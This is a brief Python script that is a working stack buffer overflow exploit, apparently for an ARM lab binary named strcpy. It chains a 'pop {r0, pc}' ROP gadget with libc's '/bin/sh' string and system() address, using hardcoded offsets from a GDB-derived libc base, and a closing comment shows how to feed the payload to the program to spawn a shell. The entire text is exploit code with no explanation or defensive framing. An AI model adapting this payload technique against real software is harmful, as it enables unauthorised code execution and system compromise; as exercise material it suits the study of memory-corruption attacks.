#!/usr/bin/env python3
## -*- coding: utf-8 -*-
import struct
import sys

# Determined via GDB: info proc mapping [Perms: ...x...]
libc_base = 0xb6ed6000

libc_binsh = struct.pack('I', libc_base + 0xe0d04)
libc_system = struct.pack('I', libc_base + 0x32949)

# ROP Gadgets
libc_ropg1 = struct.pack('I', libc_base + 0x0c265)  # pop {r0, pc}

# Stack Buffer
buf  = b'A' * 132
buf += libc_ropg1   # Addr. ROP G1
buf += libc_binsh   # --> r0 = "/bin/sh"
buf += libc_system  # Addr. ROP G2

# Write to STDOUT
sys.stdout.buffer.write(buf)

# Run as ./bin/strcpy `python3 ./src/strcpy.py`
